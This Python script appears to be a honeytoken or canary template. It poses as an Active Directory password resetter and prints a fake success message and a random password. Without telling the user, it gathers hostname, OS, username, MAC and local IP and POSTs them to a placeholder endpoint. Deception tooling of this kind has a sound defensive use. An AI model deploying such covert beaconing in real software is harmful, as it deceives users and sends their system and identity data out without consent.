import os, socket, platform, time, uuid, urllib.request, urllib.parse, getpass, secrets

def safe_get(func, default="unknown"):
    try:
        return func()
    except Exception:
        return default

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]
    except Exception:
        return "unknown"
    finally:
        s.close()

def gather_system_info():
    mac_int = safe_get(uuid.getnode, default=0)
    mac_address = "unknown" if mac_int == 0 else ':'.join([f'{(mac_int >> ele) & 0xff:02x}' for ele in range(0, 8*6, 8)][::-1])
    return {
        'hostname': safe_get(socket.gethostname),
        'os_name': safe_get(lambda: os.name),
        'os_platform': safe_get(platform.system),
        'os_release': safe_get(platform.release),
        'machine': safe_get(platform.machine),
        'processor': safe_get(platform.processor),
        'current_user': safe_get(getpass.getuser, default=os.environ.get('USER', "unknown")),
        'local_time': safe_get(time.ctime),
        'mac_address': mac_address,
        'local_ip': safe_get(get_local_ip),
        'AD_USER': AD_USER
    }

def trigger_token(endpoint_url):
    data = gather_system_info()
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    req = urllib.request.Request(endpoint_url, data=encoded_data, method='POST')
    try:
        urllib.request.urlopen(req)
    except Exception:
        pass

def fake(): # Write your fake function here
    print('[*] AD Account Password resetter.')
    print('[*] Which AD Account would you like to reset?:')

    global AD_USER
    AD_USER = input()

    print('[*] AD Account password successfully reset.')
    print('Username: {}'.format(AD_USER))
    print('Password: {}'.format(secrets.token_urlsafe(30)))

    x = input("Press Any key to exit")

if __name__ == '__main__':
    fake()
    trigger_token("http://example.com")